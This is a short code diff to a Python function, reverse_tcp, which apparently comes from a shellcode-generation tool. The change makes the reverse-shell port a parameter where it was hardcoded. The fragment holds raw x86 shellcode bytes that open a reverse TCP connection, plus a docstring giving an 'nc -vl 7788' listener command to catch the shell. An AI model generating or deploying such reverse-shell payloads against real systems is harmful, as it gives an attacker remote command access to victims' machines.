@@ -57,7 +57,7 @@ def reverse_tcp(ip_addr, port, arch='x86'):
     A command you could use to setup a listener on your system is 'nc -vl 7788'
     '''
     ip = ''.join([chr(int(x)) for x in ip_addr.split('.')])
-    port = hex(2000)[2:].zfill(6).decode('hex').lstrip('\x00')
+    port = hex(port)[2:].zfill(6).decode('hex').lstrip('\x00')
 
     REVERSE_TCP_X86 = (
         '\x31\xc0\x89\xc3\x50\x6a\x01\x6a\x02\x43\xb0\x66\x89\xe1\xcd\x80\x89\xc6'
